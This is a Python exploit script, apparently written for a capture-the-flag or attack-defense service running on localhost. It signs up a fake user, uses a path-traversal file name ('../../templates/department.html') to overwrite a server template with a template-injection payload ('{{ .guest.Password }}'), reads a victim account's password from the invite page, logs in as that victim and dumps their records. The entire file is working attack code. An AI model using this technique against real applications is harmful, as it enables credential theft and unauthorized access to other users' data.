import requests
from requests import session
import faker
from bs4 import BeautifulSoup


url = "http://127.0.0.1:2324"
payload = "{{ .guest.Password }}"
path = "../../templates/department.html"
victim = "hehehe"

def signup(session: requests.Session, username: str, password: str):
        resp = session.post(f'{url}/register', data={
            'username': username,
            'password': password,
        })
        return session

def signin(session, username, password):
     resp = session.post(f'{url}/login', data={
            'username': username,
            'password': password,
        })
     return session

def get_list_scp(session):
    resp = session.get(f"{url}/")
    soup = BeautifulSoup(resp.text, 'html.parser')
    content_div = soup.find('div', id='content')
    links = content_div.find_all('a')
    return links

def get_scp(session, links):
    for link in links:
        resp = session.get(url + link["href"])
        print(resp.text)
    
    

def createDepartment(session: requests.Session, name: str):
    resp = session.post(f'{url}/create_department', data={"name_department":name})
    return name


def set_poison(session):
    resp = session.post(f'{url}/create_scp', data={"name":path, "description": payload})

def get_password(name):
    resp = session.post(f"{url}/invite", data={"username": name})
    soup = BeautifulSoup(resp.text, 'html.parser')
    tag_html = soup.find_all('html')[-1]
    text_after_html_tag = ''.join(tag_html.find_next_siblings(string=True))
    return text_after_html_tag


session = requests.session()
session = signup(session, faker.Faker().name(), faker.Faker().password())
createDepartment(session, faker.Faker().name())
set_poison(session)
session = signin(session, victim, get_password(victim).strip())
print(get_scp(session, get_list_scp(session)))